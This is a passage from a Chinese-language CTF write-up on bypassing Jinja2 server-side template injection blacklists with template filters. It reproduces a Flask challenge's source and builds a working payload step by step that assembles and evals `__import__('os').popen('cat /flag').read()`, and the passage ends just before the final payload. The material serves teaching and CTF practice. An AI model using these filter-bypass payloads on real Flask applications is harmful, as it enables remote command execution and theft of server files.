[`center()`](https://jinja.palletsprojects.com/en/master/templates/#center) |
[`indent()`](https://jinja.palletsprojects.com/en/master/templates/#indent) |
[`pprint()`](https://jinja.palletsprojects.com/en/master/templates/#pprint) |
[`slice()`](https://jinja.palletsprojects.com/en/master/templates/#slice) |
[`upper()`](https://jinja.palletsprojects.com/en/master/templates/#upper)  
[`default()`](https://jinja.palletsprojects.com/en/master/templates/#default)
| [`int()`](https://jinja.palletsprojects.com/en/master/templates/#int) |
[`random()`](https://jinja.palletsprojects.com/en/master/templates/#random) |
[`sort()`](https://jinja.palletsprojects.com/en/master/templates/#sort) |
[`urlencode()`](https://jinja.palletsprojects.com/en/master/templates/#urlencode)  
[`dictsort()`](https://jinja.palletsprojects.com/en/master/templates/#dictsort)
| [`join()`](https://jinja.palletsprojects.com/en/master/templates/#join) |
[`reject()`](https://jinja.palletsprojects.com/en/master/templates/#reject) |
[`string()`](https://jinja.palletsprojects.com/en/master/templates/#string) |
[`urlize()`](https://jinja.palletsprojects.com/en/master/templates/#urlize)  
[`escape()`](https://jinja.palletsprojects.com/en/master/templates/#escape) |
[`last()`](https://jinja.palletsprojects.com/en/master/templates/#last) |
[`rejectattr()`](https://jinja.palletsprojects.com/en/master/templates/#rejectattr)
|
[`striptags()`](https://jinja.palletsprojects.com/en/master/templates/#striptags)
|
[`wordcount()`](https://jinja.palletsprojects.com/en/master/templates/#wordcount)  
[`filesizeformat()`](https://jinja.palletsprojects.com/en/master/templates/#filesizeformat)
| [`length()`](https://jinja.palletsprojects.com/en/master/templates/#length)
|
[`replace()`](https://jinja.palletsprojects.com/en/master/templates/#replace)
| [`sum()`](https://jinja.palletsprojects.com/en/master/templates/#sum) |
[`wordwrap()`](https://jinja.palletsprojects.com/en/master/templates/#wordwrap)  
[`first()`](https://jinja.palletsprojects.com/en/master/templates/#first) |
[`list()`](https://jinja.palletsprojects.com/en/master/templates/#list) |
[`reverse()`](https://jinja.palletsprojects.com/en/master/templates/#reverse)
| [`title()`](https://jinja.palletsprojects.com/en/master/templates/#title) |
[`xmlattr()`](https://jinja.palletsprojects.com/en/master/templates/#xmlattr)  
可以自行点击每个过滤器去查看每一种过滤器的作用。我们就是利用这些过滤器，一步步的拼接出我们想要的字符、数字或字符串。
### 常用字符获取入口点
  * 对于获取一般字符的方法有以下几种：
    {% set org = ({ }|select()|string()) %}{{org}}
    {% set org = (self|string()) %}{{org}}
    {% set org = self|string|urlencode %}{{org}}
    {% set org = (app.__doc__|string) %}{{org}}
如下演示：
    {% set org = ({ }|select()|string()) %}{{org}}
上上图所示，我们可以通过 ``
字符串获取的字符有：尖号、字母、空格、下划线和数字。
    {% set org = (self|string()) %}{{org}}
如上图所示，可以通过 `` 字符串获取的字符有：尖号、字母和空格。
    {% set org = self|string|urlencode %}{{org}}
如上图所示，可以获得的字符除了字母以外还有百分号，这一点比较重要，因为如果我们控制了百分号的话我们可以获取任意字符，这个在下面第二道题中会讲到。
    {% set org = (app.__doc__|string) %}{{org}}
如上图所示，可获得到的字符更多了。
  * 对于获取数字，除了当菜出现的那几种外我们还可以有以下几种方法：
    {% set num = (self|int) %}{{num}}    # 0, 通过int过滤器获取数字
    {% set num = (self|string|length) %}{{num}}    # 24, 通过length过滤器获取数字
    {% set point = self|float|string|min %}    # 通过float过滤器获取点 .
有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算。
下面我们通过两道题目payload的构造过程来演示一下如何使用过滤器来Bypass。
### [2020 DASCTF 八月安恒月赛]ezflask
题目源码：
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    from flask import Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directory
    app = Flask(__name__)
    @app.route("/")
    def index():
        def safe_jinja(s):
            blacklist = ['class', 'attr', 'mro', 'base',
                         'request', 'session', '+', 'add', 'chr', 'ord', 'redirect', 'url_for', 'config', 'builtins', 'get_flashed_messages', 'get', 'subclasses', 'form', 'cookies', 'headers', '[', ']', '\'', '"', '{}']
            flag = True
            for no in blacklist:
                if no.lower() in s.lower():
                    flag = False
                    break
            return flag
        if not request.args.get('name'):
            return open(__file__).read()
        elif safe_jinja(request.args.get('name')):
            name = request.args.get('name')
        else:
            name = 'wendell'
        template = '''
            Hello, %s
    ''' % (name)
        return render_template_string(template)
    if __name__ == "__main__":
        app.run(host='0.0.0.0', port=5000)
可以看到题目过滤的死死地，最关键是把attr也给过滤了的话，这就很麻烦了，但是我们还可以用过滤器进行绕过。
在存在ssti的地方执行如下payload：
    {% set org = ({ }|select()|string()) %}{{org}}
    # 或 {% set org = ({ }|select|string) %}{{org}}
可以看到，我们得到了一段字符串：``，这段字符串中不仅存在字符，还存在空格、下划线，尖号和数字。也就是说，如果题目过滤了这些字符的话，我们便可以在
``
这个字符串中取到我们想要的字符，从而绕过过滤。
然后我们在使用list()过滤器将字符串转化为列表：
    {% set orglst = ({ }|select|string|list) %}{{orglst}}
如上图所示，反回了一个列表，列表中是 ``
这个字符串的每一个字符。接下来我们便可以使用使用pop()等方法将列表里的字符取出来了。如下所示，我们取一个下划线 `_`：
    {% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}}    # _
同理还能取到更多的字符：
    {% set space = (({ }|select|string|list).pop(10)|string) %}{{spa}}    # 空格
    {% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}}    # _
    {% set zero = (({ }|select|string|list).pop(38)|int) %}{{zero}}    # 0
    {% set seven = (({ }|select|string|list).pop(40)|int) %}{{seven}}    # 7
    ......
这里，其实有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算，如下示例：
    {% set zero = (({ }|select|string|list).pop(38)|int) %}    # 0
    {% set one = (zero**zero)|int %}{{one}}    # 1
    {%set two = (zero-one-one)|abs %}    # 2
    {%set three = (zero-one-one-one)|abs %}    # 3
    {% set five = (two*two*two)-one-one-one %}    # 5
    #  {%set four = (one+three) %}    注意, 这样的加号的是不行的,不知道为什么,只能用减号配合abs取绝对值了
    ......
通过上述原理，我们可以依次获得构造payload所需的特殊字符与字符串：
    # 首先构造出所需的数字:
    {% set zero = (({ }|select|string|list).pop(38)|int) %}    # 0
    {% set one = (zero**zero)|int %}    # 1
    {% set two = (zero-one-one)|abs %}    # 2
    {% set four = (two*two)|int %}    # 4
    {% set five = (two*two*two)-one-one-one %}    # 5
    {% set seven = (zero-one-one-five)|abs %}    # 7
    # 构造出所需的各种字符与字符串:
    {% set xhx = (({ }|select|string|list).pop(24)|string) %}    # _
    {% set space = (({ }|select|string|list).pop(10)|string) %}    # 空格
    {% set point = ((app.__doc__|string|list).pop(26)|string) %}    # .
    {% set yin = ((app.__doc__|string|list).pop(195)|string) %}    # 单引号 '
    {% set left = ((app.__doc__|string|list).pop(189)|string) %}    # 左括号 (
    {% set right = ((app.__doc__|string|list).pop(200)|string) %}    # 右括号 )
    {% set c = dict(c=aa)|reverse|first %}    # 字符 c
    {% set bfh = self|string|urlencode|first %}    # 百分号 %
    {% set bfhc=bfh~c %}    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接
    {% set slas = bfhc%((four~seven)|int) %}    # 使用%c构造斜杠 /
    {% set but = dict(buil=aa,tins=dd)|join %}    # builtins
    {% set imp = dict(imp=aa,ort=dd)|join %}    # import
    {% set pon = dict(po=aa,pen=dd)|join %}    # popen
    {% set os = dict(o=aa,s=dd)|join %}    # os
    {% set ca = dict(ca=aa,t=dd)|join %}    # cat
    {% set flg = dict(fl=aa,ag=dd)|join %}    # flag
    {% set ev = dict(ev=aa,al=dd)|join %}    # eval
    {% set red = dict(re=aa,ad=dd)|join %}    # read
    {% set bul = xhx*2~but~xhx*2 %}    # __builtins__
将上面构造的字符或字符串拼接起来构造出 `__import__('os').popen('cat /flag').read()`：
    {% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}
如上图所示，成功构造出了 `__import__('os').popen('cat /flag').read()` 。
然后将上面构造的各种变量添加到SSTI万能payload里面就行了：
    {% for f,v in whoami.__init__.__globals__.items() %}    # globals
        {% if f == bul %} 
            {% for a,b in v.items() %}    # builtins
                {% if a == ev %}    # eval
                    {{b(pld)}}    # eval("__import__('os').popen('cat /flag').read()")
                {% endif %}
            {% endfor %}
        {% endif %}
    {% endfor %}
所以最终的payload为：